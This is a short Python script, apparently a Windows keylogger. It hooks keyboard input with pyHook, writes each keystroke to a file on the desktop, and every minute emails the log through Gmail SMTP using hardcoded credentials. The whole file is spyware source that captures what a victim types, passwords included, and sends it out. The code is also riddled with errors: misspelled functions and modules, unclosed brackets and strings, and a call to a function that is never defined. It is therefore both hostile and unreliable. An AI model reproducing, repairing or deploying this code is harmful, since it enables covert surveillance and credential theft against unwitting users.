import pyHook, pythoncom, sys, logging
import time, datetime
wait_seconds=60
file_log='C:\Users\User\Desktop\dat.txt'
timeout=time.time() + wait_seconds
def TimeOut():
    if time.time()>timeout:
        return True
    else:
        return False

def SendEmail(user, pwd, recipient, subject, body):
    import smtplib

    gmail_user=user
    gmail_pass=pwd
    FROM= user    
    TO= recipient if type(recipient) is list else [recipient]
    SUBJECT=subject
    TEXT=body

    message="""\FROM %s\nTo: %s\nSubject_ %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server=smtplib.SMTP("smtp.gmail.com",587
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pass)
        server.sendmai(FROM, TO, message)
        server.close()
        print "Mail sent: succesfully"
    except:
        print "Mail sent: unsuccesfully"

def FormatAndSendLogEmail():
    with open(file_logm, 'r+') as f:
        actualdate=datatime.datatime.now().strftime("%Y-%m-%d %H:%M: %S)
        data=f.read().replace('\n','');
        data='Log capturado a las: '+actualdate + '\n' + data 
        SendEmail('joshanccoma@gmailcom','newgmail','joshanccom@gmail.com',
        'Nuevo log - '+actualdate, data)
        f.seek(0)
        f.truncate()


def OnKeayboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG,
        format='%(message)s')
    logging.log(10, char(event.Ascii))
    return True

hooks_manager=pyHook.hooks_manager()
hooks_manager.KeyDown=OnKeayboardEvent
hooks_manager.HookKeyBoard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout=time.time()+wait_seconds
    pythoncom.PumpWaitingMessage()